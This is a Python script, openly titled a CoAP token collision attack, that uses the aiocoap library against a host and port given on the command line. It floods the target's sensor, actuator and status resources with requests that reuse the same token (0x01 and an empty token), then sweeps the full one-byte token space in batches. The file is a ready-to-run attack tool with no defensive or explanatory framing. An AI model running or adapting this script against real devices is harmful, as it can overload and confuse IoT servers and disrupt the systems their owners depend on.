#!/usr/bin/env python3
"""
CoAP Token Collision Attack
"""

import asyncio
import sys
import time
from aiocoap import *
from aiocoap.numbers.codes import Code

attack_stats = {
    'requests_sent': 0,
    'collisions_forced': 0,
    'responses_received': 0,
    'errors': 0
}

class TokenCollisionAttacker:
    def __init__(self, target_host, target_port):
        self.target = f"coap://{target_host}:{target_port}"
    
    async def send_request_with_token(self, request_id, resource, token_bytes):
        try:
            protocol = await Context.create_client_context()
            
            uri = f"{self.target}{resource}"
            request = Message(code=GET, uri=uri)
            
            request.token = token_bytes
            
            print(f"Request {request_id:04d}: Token={token_bytes.hex()} → {resource}")
            
            response = await protocol.request(request).response
            
            attack_stats['requests_sent'] += 1
            attack_stats['responses_received'] += 1
            
            print(f"Response {request_id:04d}: {response.code} | Payload={response.payload[:30]}")
            
        except Exception as e:
            attack_stats['errors'] += 1
            print(f"Error request {request_id}: {e}")
    
    async def token_collision_attack(self, collision_token, num_requests, resources):
        
        print(f"\nForcing {num_requests} requests with Token={collision_token.hex()}")
        print(f"The server will need to correlate {num_requests} responses to the same token!\n")
        
        tasks = []
        for i in range(num_requests):
            resource = resources[i % len(resources)]
            task = self.send_request_with_token(i, resource, collision_token)
            tasks.append(task)
            await asyncio.sleep(0.01)  # Small delay
        
        await asyncio.gather(*tasks, return_exceptions=True)
        
        attack_stats['collisions_forced'] += 1
    
    async def exhaustive_token_space_attack(self, resources):
        
        print("\nTesting the full 1-byte token space (0x00-0xFF)...\n")
        
        tasks = []
        for token_value in range(256):
            token_bytes = bytes([token_value])
            resource = resources[token_value % len(resources)]
            task = self.send_request_with_token(token_value, resource, token_bytes)
            tasks.append(task)
            
            if len(tasks) >= 50:  # Batches of 50
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks.clear()
                await asyncio.sleep(0.5)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async def launch_attack(self):
        """Launch the full token collision attack."""
        
        resources = [
            "/sensor/temp",
            "/sensor/humidity",
            "/actuator/led",
            "/status",
            "/.well-known/core",
        ]
        
        print("\nStarting CoAP Token Collision Attack...\n")
        
        # Phase 1: Massive collision with token 0x01
        collision_token = b'\x01'
        await self.token_collision_attack(collision_token, 100, resources)
        await asyncio.sleep(2)
        
        # Phase 2: Collision with empty token (0 bytes)
        print("\nPhase 2: Empty token (0 bytes)")
        collision_token = b''
        await self.token_collision_attack(collision_token, 50, resources)
        
        await asyncio.sleep(2)
        
        # Phase 3: Full token-space sweep
        print("\nPhase 3: Full sweep (0x00-0xFF)")
        await self.exhaustive_token_space_attack(resources)
        print(f"Requests sent: {attack_stats['requests_sent']}")
        print(f"Forced collisions: {attack_stats['collisions_forced']}")
        print(f"Responses received: {attack_stats['responses_received']}")
        print(f"Errors: {attack_stats['errors']}")

async def main():
    if len(sys.argv) < 3:
        sys.exit(1)
    
    target_host = sys.argv[1]
    target_port = int(sys.argv[2])
    
    print(f"Target: {target_host}:{target_port}")
    print(f"Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}")
    
    attacker = TokenCollisionAttacker(target_host, target_port)
    await attacker.launch_attack()

if __name__ == "__main__":
    asyncio.run(main())
